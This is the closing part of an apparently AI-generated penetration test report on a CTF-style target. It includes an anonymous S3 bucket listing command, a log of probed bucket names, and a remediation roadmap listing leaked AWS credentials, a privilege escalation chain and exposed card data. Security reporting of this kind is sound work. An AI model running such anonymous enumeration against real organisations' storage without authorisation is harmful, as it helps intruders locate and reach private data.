```bash
aws s3 ls s3://huge-logistics.com --no-sign-request --region us-east-1
```

#### Evidence / Logs

```
huge-logistics.com: AccessDenied (bucket exists)
www.huge-logistics.com: NoSuchBucket
staging.huge-logistics.com: NoSuchBucket
prod.huge-logistics.com: NoSuchBucket
huge-logistics: NoSuchBucket
huge-logistics-backup: NoSuchBucket
huge-logistics-data: NoSuchBucket
huge-logistics-dev: NoSuchBucket
huge-logistics-internal: NoSuchBucket
```

#### Remediation

1. Review access controls on all organizational S3 buckets. 2. Ensure no sensitive data is exposed. 3. Consider enabling S3 Block Public Access account-wide.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Hardcoded AWS IAM Credentials in Publicly Accessible S3 Obje... | High |
| Mass Credential Dump in Publicly Accessible S3 Object (test-... | High |
| Privilege Escalation Chain: Anonymous S3 → pam-test → it-adm... | High |
| PCI Data Breach — 29 Credit Card Records with CVVs, Password... | High |
| CTF Flag Retrieved — Proof of Full Compromise (a49f18145568e... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| S3 Bucket Anonymous Listing Enabled — Public Directory Trave... | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| AWS Account ID Disclosed via Leaked Credentials — Account 79... | High |
| Second Hardcoded AWS IAM Credentials in migrate_secrets.ps1 ... | High |

### P3 — Long term (< 1 month)

| Finding | Effort |
|---------|--------|
| Sibling S3 Bucket Exists: huge-logistics.com (Access Denied ... | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T12:35:04Z*  
*Campaign: camp_20260802_03bfc675 | Target: dev.huge-logistics.com*
